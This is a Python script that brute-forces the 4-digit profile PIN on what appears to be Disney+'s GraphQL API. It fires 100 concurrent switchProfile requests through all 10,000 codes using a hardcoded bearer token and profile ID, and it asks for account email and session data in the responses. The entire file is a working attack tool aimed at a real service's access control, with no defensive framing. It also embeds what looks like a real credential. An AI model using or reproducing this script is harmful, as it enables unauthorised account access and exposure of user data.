import asyncio
import aiohttp

class PinBruteforcer:
    def __init__(self):
        self.url = "https://disney.api.edge.bamgrid.com"
        self.headers = "eyJ6aXAiOiJERUYiLCJraWQiOiJ0Vy10M2ZQUTJEN2Q0YlBWTU1rSkd4dkJlZ0ZXQkdXek5KcFFtOGRJMWYwIiwiY3R5IjoiSldUIiwiZW5jIjoiQzIwUCIsImFsZyI6ImRpciJ9..a32CEqHazouoyNET.nqHKohWDT8eeNozSD7Jo2OexJHHKIa3MKDoV7dhU-RR7ysI9FoQ0LSM1lhfy5Px3f5GFj9SMHoXiSweOTrY2yGaDanJ8c6C9ecfzhYRgJBFV_MnezeRKXjHNT3cYQ9rO_1eeoYFnYT7yVeiXOLRzSGc8FWy4ksrhm2GIU2OPFxSc6rBftdbev3KAJipsBrpvngfv83LnfH5Yughfm0x0O-J1HRVexQorCPtiQAAT-GCm_rmQt9FvJlzshjRkMikyQNG3pGcqaJAdUxCdu_BpygFLAtcG-wevbONxgGuMTsNtoGP4O90Oiu11qTWaJbX45WqYNVZMSAJqoe3lLSbdtVzIjBzn-L0pj3LU43_v8v3XXA1h4dMpiozxkldk_jibCFgt3UMo9a5erBock4Flx2Xc0GLPFLCfkzGgZi6Pf_U0oiiRjxVmpO7XV2cdAObEPWd0z-iWTo8SdeHI4xi4SsppjQd7yGbbPmNBYkj_AdpoA-ln1gyxac0eabNmB91052bx9xvIG9v0LzvSxYExDQ3UjPKniNySRbwHkRy-xRsiVLV-bPbSf-rO3u_WrRhVm0WAmQ1xXEla-5MfWIXXFrbPF4WUvnMhCnqxIdjNIelZ9ugTbn6RDwXdq2nrBivHNdWSSqj3nC6GnuLpyWeVkND3AWYmGigChbpOLxRRaUWCPRIdabC7Gtj3LFLgoQMnMvcNfQYn_Fl0YV1znFQ3HJjGj_ZumQgiiE8x0OX0r95eFf7I9SNPDzFTQc8RFF92fm_T7WO_81jTJtkx_hjUawzmcqlnX_BqUh5wFtceLUqs7yPs6x5cMf4wz0ncC0FTSqj0izqWF8RbmaS0EqITGdwmFT_Y7AKEbjBczNYlX3q2I3bosi_OWrDboN2XvIjhNt9fHwaqjHIPDT4lTzzRsdib8D7SP4m22TNB87Ou-xSIrFw2yZyHhW-BNWqweDJNdmmSv3jzErxrEKjRpAnCSYij9o-pHDYaK4evevoVkxApxM_OSOEP3W0MfJcvXIcMFC2amIFZsVqvJozkWn850igZWuJ9IufOcvHKSctW5ieSCISfGTOALw_OnKp-MuTRJTZzq3XfmbjmX1H9tRlnkJhlPR483lfrTX9ZZ02O_cpNjciCoUVPVOuiehGStnXc7QdxEr6ZmtHkr6Rv9XNOvPXYKgpxhJeCMJYUPosvFVnPeaUQFElpYBOgFLMXAMZI6X343cOdFjJhBGZolJC1HT_gZ3R0crHbT-1EPXs0smOhOHHtRnJOdkxj5stpy8y9W_8y26CJ8pRHz1wQI8ODzNgDTEktgwb-mc47u8_i_ZnB65Vr-MdDTKPQsV7VQyuBic08eSJDLJWEovmvG-nho2PlMBA6h21M8GXB79DVkkX52AApJDlAZyIfVEDdQIv_63qrF14ajJwLJ6CsTcxK0qNtXwJA5ST5RYpdTK5MGtF7bBdB6ce6-axDOnQ6raj58rqgE6oZcgwzRCsns8TqBUYSPjvqDoyd08Gy5Xa-GXIuRaL4NW1gxDSuWA8-eOjXo-sJ97LKiUlNzFdCX-QaR3e2mFrUnPulZIHMTwQZF0EPxI21rEy2hbKluuRvxpD0lJyiPWgqDLvcwxr6THyVxjk4ghADCxhyBAMIRSqRQUu6FRCflKMYLf4J8iTVl-_zz3KvwAqtc3naacvUvBfM_279E0om3VxX6MUpJwIltEo4S4noLELMrM2GGzBLbYBMEZcocqlsDVAYL3UMpqfnbiM_Ez8eLUfKuCCEa3Kvovi_Jb0zT4vig12y4Nn2aRNvP2h_-cWfBZA54KY-RZPOZHeixyXCfZlJaOtVtZ1B6DHNt8r29cNXtsgf-58J7XRsAKYCDeFII_rC3x27r3baQiZ-BcHzWI1SZkPr5Xt9dQgws_5m6Fh1D0zTUavSbSvaAtgP6e5jFz-luCT9HecnJihEbYdmpH23_5VTk8kEEJ1FFVpV3GJS3hVyYhjrwdof8i4xJLFZfhwkQtOneRPOmG-Crtpz-B5iBQUGeBlK9ldJCXJO9fRa2DisVE6FlS7W1lgvDcYWRP6-6dH9u5j-6G1nYgEsAcgEw4OOGsHmCHo3X5y1WuW3qtYFBGEEfWTrq7ICtO-QZLI6nXgo5JxAo1DmOgMfks9xHMZCMnbu7wz21Wtedw4riPWUPCOaVRTtXYaPXytowLvceZATaRDpmUni6k_Akq4Cu67CVEpGW6TRKHXc1eY8prfwMMR2Ujj8b3WhqcDJOxRPqmxzyK2r1XKGf5gdsv2-QTeZZ9kZBAQhKOH5SA8XqZ9abjjyr6fLQE4d44tejIWRwLmBxJHELuqaaTmp_BE4EwMLW3Y4vJQKyes-tAG5kolxTZ7LRP03usYUOHCNaEhbe4VDe4ob3vVkzhMDkEn3WGMutlnZNaS290OLArtDpiejdNKKwdi9bRQpw7uT0uBrbvZvhpOHdQM76fD7Ztoroi4IN1K0JcxqGSNbG5RbvzbVd4jLhI4Q94P0jvyh17T_XkAg-2UNXV91fkWHyKdkUd-CMI8kj7pTq610FUubG2uxVVkculpdXfoPBUgL0eXorugk1ucapxO5F8h_djrf9VEPJh3jA3qmgOQ6K8JpnWh0LyeWnQgTUjPHbv69BKvn5pSpvlPPHHFvv0R5Mxut04XEsD7jzRdJFTdC6pxMtshnk6RXp-GtRkEFQSNROQ-G1LG1gKiA_9DNy53gqS-ae6wn9JjMMydE5mKGSQ6hPWintCGjZPn3jVNlouk049i8L2tga3qzFzoynYORFNOPat0xDZXPhzPbUbtk8seH1LBs4Sx5jmusYVfb9NLdoXTycMpvGFfooPsFP2OqZTCI6bt9uCgx49zIW6tVpJ6cFGA9fzP9xGi7ee8nDHcmrYc9oCKEjrj1rHKdKGOn2ov-xBvrZ49AQBOTxYlnzCOHUSz1JfRawBpO770H5990tFAKPWelyvL4QAJaGgMu6K7Et9RX9UjwR3uq8ZOF5L1i-8x4t5ic4Qr7mt-cnDttUe1axrVawCXaj_A_wfwK5yKHAGMYfh_XLzcbcxwHfrn5Ej0KG-J_0GpkXsww7J4PlUJNHIshKvrSO3kgEUosT40OImE5XwG3EWbBwwqf1MeRV3aDKuFhfvXiK5dwbxHhvCUibjj3YrpRHK7_O-5tL9P2RmhabWZvv880wiWmPgrJg-pjlx6GBpHO0H_Ob7otlfC2MT3CRxpr_tzw6G53rce4asxgzzVpc0cGCKOnyFUEn1dTfqpotMK94y64PhkAUmkfFame4PojKwKvAbMKWFU.g8qBm_90oxBqvLRGlJe4Qw"
        self.queue = asyncio.Queue()
        self.stop_event = asyncio.Event()
        self.correct_code = None
        self.error = False
        
    async def setup_queue(self):
        for code in range(10000):
            await self.queue.put(f"{code:04d}")
        print(f"Queue setup complete with {self.queue.qsize()} codes")
        
    async def crack_code(self, session):
        while not self.stop_event.is_set():
            try:
                current_code = await asyncio.wait_for(self.queue.get(), timeout=1.0)
            except asyncio.TimeoutError:
                self.stop_event.set()
                break
            
            if self.stop_event.is_set():
                self.queue.task_done()
                break
            
            payload = {
                "query": """
                    mutation switchProfile($input: SwitchProfileInput!) {
                        switchProfile(switchProfile: $input) {
                            account {
                                id
                                accountConsentToken
                                attributes {
                                email
                                emailVerified
                            }
                            activeProfile {
                                id
                                name
                            }
                        }
                        activeSession {
                            sessionId
                        }
                    }
                } 
                """,
                "variables": {
                    "input": {
                        "entryPin": f"{current_code}",
                        "profileId": "6558a127-cd92-4d97-beef-bba843ae1f87",
                    }
                },
                "operationName": "switchProfile",
            }
            headers = {
                "Authorization": f"Bearer {self.headers}",
            }
            
            async with session.post(f"{self.url}/v1/public/graphql", json=payload, headers=headers) as response:
                if response.status != 200:
                    self.error = f"HTTP error {response.status}"
                    self.stop_event.set()
                    break
                
                result = await response.json()
                invalid = next((e.get("extensions", {}).get("code") for e in result.get("errors", []) if e.get("extensions")), result.get("errors", [{}])[0].get("code"))
                
                if not invalid:
                    self.correct_code = current_code
                    self.stop_event.set()
                else:
                    error_codes = {
                        "token.service.invalid.grant": "Invalid profile ID", 
                        "access-token.invalid": "Invalid access token",
                    }
                    if invalid in error_codes:
                        invalid_msg = error_codes[invalid]    
                        self.error = invalid_msg
                        self.stop_event.set()
                    else:
                        print(f"\rTried code: {current_code} but it was not valid", end="", flush=True)
        
        self.queue.task_done()

async def main():
    await bruteforcer.setup_queue()
    
    async with aiohttp.ClientSession() as session:
        tasks = [asyncio.create_task(bruteforcer.crack_code(session)) for i in range(100)]
        await asyncio.gather(*tasks)

    if bruteforcer.error: 
        print(f"An error occurred: {bruteforcer.error}")
        return

    if bruteforcer.correct_code:
        print(f"\nThe correct PIN code is: {bruteforcer.correct_code}")
        return
        
    print("\nBruteforce attempt completed. But no valid code was found.")
        
if __name__ == "__main__":
    bruteforcer = PinBruteforcer()
    asyncio.run(main())
